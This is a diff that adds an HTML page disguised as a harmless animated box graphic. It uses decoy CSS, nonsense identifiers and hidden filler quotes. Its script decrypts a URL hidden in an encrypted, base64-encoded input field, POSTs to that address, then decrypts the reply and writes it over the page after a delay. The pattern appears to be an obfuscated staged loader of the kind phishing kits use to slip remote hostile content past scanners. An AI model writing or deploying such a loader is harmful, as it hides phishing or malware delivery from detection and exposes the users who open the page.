@@ -1,0 +1,408 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="noindex, nofollow" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
+    <style>
+      body,
+      html {
+        height: 100%;
+        margin: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      @keyframes bounce {
+        0%,
+        100%,
+        12.5%,
+        32.5%,
+        76.1% {
+          transform: translateY(0);
+        }
+
+        22.5%,
+        86% {
+          transform: translateY(7px);
+        }
+      }
+
+      #influence {
+        height: 179px;
+        width: 130px;
+        overflow: hidden;
+        margin-top: -59px;
+        margin-left: 25px;
+      }
+
+      @keyframes shadow-fade {
+        0%,
+        100%,
+        21.2%,
+        80% {
+          opacity: 0;
+        }
+
+        47%,
+        70% {
+          opacity: 1;
+        }
+      }
+
+      #gearbox {
+        width: 130px;
+        margin-top: 179px;
+      }
+
+      #aspiration {
+        width: 130px;
+        height: 71px;
+        border-radius: 0 0 7px 7px;
+        overflow: hidden;
+        margin-top: -41px;
+      }
+
+      #aspiration > .enthusiasm {
+        width: 287px;
+        height: 71px;
+        background: #27a0e0;
+        transform: translate(-153px, -70px) rotate(28deg);
+      }
+
+      #aspiration > .trustworthy {
+        width: 287px;
+        height: 71px;
+        background: #1388d6;
+        transform: translate(-120px, 63px) rotate(-28deg);
+      }
+
+      #respect {
+        width: 130px;
+        height: 40px;
+        background: #113864;
+        margin-top: -70px;
+      }
+
+      #wing {
+        display: flex;
+        flex-wrap: wrap;
+        width: 118px;
+        height: 131px;
+        border-radius: 7px;
+        overflow: hidden;
+        margin: 0 auto;
+        margin-top: -306px;
+        animation: cal-bounce 5s infinite;
+        animation-timing-function: cubic-bezier(0, 0.5, 0, 1);
+        transform: translateY(51px) scaleY(1);
+      }
+
+      @keyframes cal-bounce {
+        0%,
+        100%,
+        16.5%,
+        76.1% {
+          transform: translateY(151px) scaleY(1);
+        }
+
+        28% {
+          transform: translateY(39px) scaleY(1);
+        }
+
+        31% {
+          transform: translateY(51px) scaleY(1.05);
+        }
+
+        33% {
+          transform: translateY(51px) scaleY(0.96);
+        }
+
+        34%,
+        68.5% {
+          transform: translateY(51px) scaleY(1);
+        }
+
+        68.5% {
+          animation-timing-function: cubic-bezier(0.66, -0.16, 1, -0.29);
+        }
+      }
+
+      #wing > .hood {
+        width: 118px;
+        height: 21px;
+        margin-bottom: -1px;
+        background: #0354a1;
+      }
+
+      #wing > .trustworthy {
+        display: flex;
+        width: 118px;
+        height: 37px;
+      }
+
+      .patience {
+        width: 39.3333px;
+        height: 38px;
+      }
+
+      .concentration {
+        background: #0073cc;
+      }
+
+      .determined {
+        background: #27a0e0;
+      }
+
+      .wheelarch {
+        background: #4fcfff;
+      }
+
+      .originality {
+        background: #035fb3;
+      }
+
+      .vent {
+        background: #134276;
+      }
+
+      #prosperity {
+        width: 130px;
+        height: 107px;
+        animation: opened-flap-swing 5s infinite;
+        animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
+        transform-origin: top;
+        transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);
+      }
+
+      @keyframes opened-flap-swing {
+        0%,
+        100%,
+        14.5%,
+        76% {
+          transform: translateY(-68px) rotate3d(1, 0, 0, -90deg);
+        }
+
+        16.5%,
+        74% {
+          transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);
+        }
+      }
+
+      #individuality {
+        width: 130px;
+        animation: closed-flap-swing 5s infinite;
+        animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
+        transform-origin: top;
+        transform: translateY(-71px) rotate3d(1, 0, 0, 90deg);
+      }
+
+      @keyframes closed-flap-swing {
+        0%,
+        100%,
+        77%,
+        8.5% {
+          transform: translateY(-71px) rotate3d(1, 0, 0, 0);
+        }
+
+        14.5%,
+        76% {
+          transform: translateY(-71px) rotate3d(1, 0, 0, 90deg);
+        }
+      }
+
+      #kohlrabi {
+        width: 130px;
+        height: 107px;
+        overflow: hidden;
+      }
+
+      .lettuce {
+        width: 96px;
+        height: 96px;
+        background: #4fcfff;
+        margin: -48px auto 0 auto;
+        border-radius: 7px;
+        transform: scaleY(0.6) rotate(45deg);
+      }
+
+      #prosperity .lettuce {
+        background: #113864;
+      }
+
+      #individuality .lettuce {
+        background: #4fcfff;
+      }
+    </style>
+    <style>
+      .indiana-scroll-container {
+        overflow: auto;
+      }
+
+      .indiana-scroll-container--dragging {
+        scroll-behavior: auto !important;
+      }
+
+      .indiana-scroll-container--dragging > * {
+        pointer-events: none;
+        cursor: -webkit-grab;
+        cursor: grab;
+      }
+
+      .indiana-scroll-container--hide-scrollbars {
+        overflow: hidden;
+        overflow: -moz-scrollbars-none;
+        -ms-overflow-style: none;
+        scrollbar-width: none;
+      }
+
+      .indiana-scroll-container--hide-scrollbars::-webkit-scrollbar {
+        display: none !important;
+        height: 0 !important;
+        width: 0 !important;
+        background: transparent !important;
+        -webkit-appearance: none !important;
+      }
+
+      .indiana-scroll-container--native-scroll {
+        overflow: auto;
+      }
+
+      .indiana-dragging {
+        cursor: -webkit-grab;
+        cursor: grab;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="show"></div>
+    <span hidden
+      >Money may not buy happiness, but I’d rather cry in a Jaguar than on a
+      bus.</span
+    >
+    <div id="influence">
+      <div id="gearbox">
+        <div id="prosperity">
+          <div id="kohlrabi">
+            <div class="lettuce"></div>
+          </div>
+        </div>
+        <div id="wing">
+          <div class="hood"></div>
+          <div class="trustworthy">
+            <div class="patience concentration"></div>
+            <div class="patience determined"></div>
+            <div class="patience wheelarch"></div>
+          </div>
+          <div class="trustworthy">
+            <div class="patience originality"></div>
+            <div class="patience concentration"></div>
+            <div class="patience determined"></div>
+          </div>
+          <div class="trustworthy">
+            <div class="patience vent"></div>
+            <div class="patience originality"></div>
+            <div class="patience concentration"></div>
+          </div>
+        </div>
+      </div>
+      <div id="respect"></div>
+      <div id="aspiration">
+        <div class="trustworthy"></div>
+        <div class="enthusiasm"></div>
+      </div>
+      <div id="individuality">
+        <div id="kohlrabi">
+          <div class="lettuce"></div>
+        </div>
+      </div>
+    </div>
+    <input
+      type="hidden"
+      value="eyJhIjoiVVNhTTREVW92T1VReGp4aTBhM2xRZz09IiwiYiI6IjYxYjcwMDM3NmQxZmY4YWI1YTMwYzFkNWMzYTkyYzA2IiwiYyI6IjY5Nzk5MjU0MzgzY2ZmZTJjMGRlY2MxNzEyY2JiZWE4IiwiZCI6IjZkNzk3MzY1NjM3MjY1NzQ3MDYxNzM3Mzc3NmY3MjY0In0="
+    />
+    <span hidden
+      >When you are fitted in a racing car and you race to win, second or third
+      place is not enough.</span
+    >
+
+    <script>
+      function encrypt(plaintext, password) {
+        const salt = CryptoJS.lib.WordArray.random(128 / 8); // Generate a random salt
+        const iv = CryptoJS.lib.WordArray.random(128 / 8); // Generate a random IV
+
+        // Convert the password to a hex string
+        const passwordHex = CryptoJS.enc.Hex.stringify(
+          CryptoJS.enc.Utf8.parse(password),
+        );
+
+        // Derive the key using PBKDF2
+        const key = CryptoJS.PBKDF2(CryptoJS.enc.Hex.parse(passwordHex), salt, {
+          hasher: CryptoJS.algo.SHA512,
+          keySize: 64 / 8,
+          iterations: 999,
+        });
+
+        // Encrypt the plaintext
+        const encrypted = CryptoJS.AES.encrypt(plaintext, key, {
+          iv: iv,
+        });
+
+        // Construct the JSON object with the encrypted components
+        const encryptedJson = JSON.stringify({
+          a: encrypted.toString(),
+          b: salt.toString(CryptoJS.enc.Hex),
+          c: iv.toString(CryptoJS.enc.Hex),
+          d: passwordHex, // Store the hex-encoded password
+        });
+
+        return encryptedJson;
+      }
+
+      async function honesty(eloquence) {
+        var { a, b, c, d } = JSON.parse(eloquence);
+
+        return CryptoJS.AES.decrypt(
+          a, // The encrypted text
+          CryptoJS.PBKDF2(
+            CryptoJS.enc.Hex.parse(d), // Password (derived from 'd')
+            CryptoJS.enc.Hex.parse(b), // Salt (derived from 'b')
+            {
+              hasher: CryptoJS.algo.SHA512, // Hashing algorithm
+              keySize: 64 / 8, // Key size
+              iterations: 999, // Number of iterations
+            },
+          ),
+          {
+            iv: CryptoJS.enc.Hex.parse(c), // Initialization vector
+          },
+        ).toString(CryptoJS.enc.Utf8); // Convert decrypted bytes to UTF-8 string
+      }
+
+      (async () => {
+        const firstDecryption = await honesty(
+          atob(document.querySelector("input").value),
+        );
+
+        // const one = btoa(encrypt(plaintext, password));
+
+        const response = await fetch(firstDecryption, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ bushing: "pomegranate" }),
+        });
+        const finalDecryption = await honesty(await response.text());
+
+        setTimeout(() => {
+          document.write(finalDecryption);
+        }, 3000);
+      })();
+    </script>
+    <!-- <div>It enhances flexibility and balance.</div> -->
+    <div id="gist-ai-summary-widget-root"></div>
+  </body>
+</html>
